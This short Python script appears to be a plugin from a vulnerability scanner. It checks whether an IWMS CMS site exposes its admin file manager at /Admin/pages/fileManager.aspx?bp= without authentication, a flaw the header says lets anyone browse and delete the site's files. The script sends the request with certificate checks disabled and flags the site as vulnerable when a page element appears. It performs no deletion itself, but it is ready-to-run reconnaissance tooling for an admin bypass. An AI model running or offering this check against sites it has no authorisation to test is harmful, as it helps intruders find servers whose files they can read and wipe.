#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: IWMS系统后台绕过&整站删除
referer: http://www.wooyun.org/bugs/wooyun-2010-085284
author: Lucifer
description: 禁用JS可越权查看文件目录,并人容易删除文件。
'''
import sys
import requests
import warnings
def run(url):
        result = ['IWMS系统后台绕过&整站删除','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/Admin/pages/fileManager.aspx?bp="
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"btnCreateFolder" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
